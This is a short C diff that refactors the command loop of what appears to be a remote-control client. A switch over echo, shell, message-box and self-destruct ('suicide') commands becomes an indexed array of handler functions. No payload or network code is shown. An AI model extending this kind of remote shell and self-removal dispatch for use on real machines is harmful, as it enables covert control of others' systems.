@@ -139,6 +139,7 @@ void listen_for_cmds()
 {
     int bytes_read;
     struct cmd cmd;
+    void (*cmd_type_handler[])() = {handle_echo, handle_shell, handle_msgbox, handle_suicide};
 
     while (TRUE)
     {
@@ -149,20 +150,6 @@ void listen_for_cmds()
             log_error("Received invalid command.");
             continue;
         }
-        switch (cmd.type)
-        {
-        case ECHO_CMD_TYPE:
-            handle_echo();
-            break;
-        case SHELL_CMD_TYPE:
-            handle_shell();
-            break;
-        case MSGBOX_CMD_TYPE:
-            handle_msgbox();
-            break;
-        case SUICIDE_CMD_TYPE:
-            handle_suicide();
-            break;
-        }
+        cmd_type_handler[cmd.type]();
     }
 }
